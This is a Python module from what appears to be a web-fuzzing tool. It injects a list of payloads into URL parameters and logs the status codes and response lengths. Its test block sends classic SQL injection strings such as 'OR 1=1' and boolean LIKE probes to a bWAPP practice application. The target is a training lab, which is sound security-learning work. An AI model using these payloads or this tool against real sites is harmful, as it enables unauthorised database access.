from requests.utils import requote_uri
import requests
from .parse import parser
from .check_host_is_up import is_host_up
from .post_request import createSessionBwapp, URL
# from parse import parser
# from check_host_is_up import is_host_up
# from post_request import createSessionBwapp, URL


# payloads is common across all attack type, therefore we can simplify this by 
# giving payloads as argument

# URL = "http://47.245.99.142/login.php"
URL = URL

def get_request(url: str, payloads: list, login_dvwa: bool = False):
    if (login_dvwa):
        session = createSessionBwapp(URL) 
    else:
        session = requests
    if (not is_host_up(url)):
        raise requests.ConnectionError("Host is Down")
    parsed_text = parser(url, payloads)
    url_payload = list(map(requote_uri, parsed_text["url_payload"]))
    result = []
    for index, url in enumerate(url_payload):
        response = session.get(url)
        status_code = response.status_code
        try:
            content_length = response.headers["Content-Length"]
        except:
            content_length = len(response.text)
        result.append([payloads[index], status_code, content_length])
    return result

# unit testing passed
if __name__ == "__main__":
    payloads=['OR 1=1',
            'OR 1=0',
            " OR 3409=3409 AND ('pytW' LIKE 'pytW",
            " OR 3409=3409 AND ('pytW' LIKE 'pytY",
            ' AS INJECTX WHERE 1=1 AND 1=1#']
    get_request("https://bwapp.hakhub.net/sqli_1.php?title=$$&action=search", payloads=payloads, login_dvwa=True)